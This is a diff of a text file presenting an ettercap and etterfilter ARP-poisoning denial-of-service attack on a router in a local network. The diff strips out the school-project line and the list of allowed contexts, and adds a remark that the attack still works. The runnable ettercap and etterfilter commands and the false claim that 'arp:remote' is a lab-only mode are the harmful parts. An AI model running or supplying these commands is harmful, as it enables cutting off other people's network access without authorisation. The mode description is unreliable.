@@ -1,9 +1,8 @@
 #############################################################################
 #                                                                           #
 #            THEORETICAL PROJECT ON LOCAL NETWORK SECURITY                  #
-#              (School Capstone Project – Year 2024/2025)                   #
 #                                                                           #
-#                *** CONTROLLED DOS SIMULATION ***                           #
+#                *** CONTROLLED DOS SIMULATION ***                          #
 #                                                                           #
 #############################################################################
 
@@ -40,28 +39,25 @@ if(ip.src == '192.168.X.X' || ip.dst == '192.168.X.X') {
 etterfilter block_router.ef -o block_router.efo --strict
 
 # Lab application (requires root)
-sudo ettercap -T -M arp:remote -F block_router.efo /192.168.X.X//
+sudo ettercap -T -M arp:remote -F block_router.efo /192.168.X.X// 
 
 === CODE END ===
 
-=== TECHNICAL DOCUMENTATION ===
+=== TECHNICAL DOCUMENTATION ==
 
 *Key parameters:*
 - `drop()`: Simulates packet removal
 - `kill()`: Terminates active connections
 - `arp:remote`: Lab mode (not real-world)
 
-=== ALLOWED CONTEXTS ===
-1. University lab (e.g. Ethical Hacking course)
-2. Authorized CTFs (Capture The Flag)
-3. Certification simulations:
-   - CEH (Certified Ethical Hacker)
-   - Cisco CyberOps
 
 === EDUCATIONAL PURPOSES ===
 1. Analysis of the ARP protocol
 2. Improve my digital skills for ethical and legal purposes, mainly to learn
 
 === CLOSING ===
+This type of dos attack is now old but its still working, bettercap will work better if used properly. 
+
 Any reproduction outside an
 educational context is strictly forbidden.
+
